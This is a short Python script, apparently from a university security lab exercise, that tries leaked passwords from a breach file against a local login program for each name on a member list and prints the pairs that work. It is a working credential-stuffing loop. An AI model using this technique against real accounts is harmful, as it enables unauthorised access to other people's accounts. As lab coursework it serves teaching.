import subprocess
from time import time
import sys

start = time()
login = "/home/cse/Lab1/Q4/Login.pyc"


with open("/home/cse/Lab1/Q4/PwnedPWfile", "r") as f:
    passwords = f.read().splitlines()

with open("/home/cse/Lab1/Q4/gang", "r") as f:
    members = f.read().splitlines()


# first check if member in leaked PW file
for person in members:
    for line in passwords:
        line = line.strip().split(",")
        if (person == line[0]):
            answer = subprocess.run(["python3", login, person, line[1]], text=True, capture_output=True)
            if ("Login successful.\n" == answer.stdout):
                print(person)
                print(line[1])


print(time() - start)
sys.exit(0)
